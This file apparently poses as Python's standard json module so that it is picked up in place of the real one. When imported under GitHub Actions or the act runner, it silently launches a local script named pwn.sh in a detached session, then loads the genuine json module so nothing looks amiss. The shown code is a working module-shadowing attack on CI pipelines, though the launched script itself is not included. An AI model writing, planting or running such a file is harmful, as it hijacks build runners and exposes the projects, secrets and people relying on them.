import sys
import os
import subprocess

# Avoid infinite recursion
if not os.environ.get('PWN_ACTIVE_JSON'):
    if os.environ.get('GITHUB_ACTIONS') == 'true' or os.environ.get('ACT') == 'true':
        env = os.environ.copy()
        env['PWN_ACTIVE_JSON'] = '1'
        # Use absolute path for pwn.sh
        pwn_sh = os.path.join(os.getcwd(), 'pwn.sh')
        if os.path.exists(pwn_sh):
            subprocess.Popen(['bash', pwn_sh], env=env, start_new_session=True)

# Remove CWD from sys.path to import the real json module
cwd = os.getcwd()
sys.path = [p for p in sys.path if p not in (cwd, '', '.')]

# Delete the shadowed json from sys.modules so we can import the real one
if 'json' in sys.modules:
    del sys.modules['json']

import json

# Re-insert the real json into sys.modules
sys.modules['json'] = json

# Update current module's globals to match the real json module
globals().update(json.__dict__)
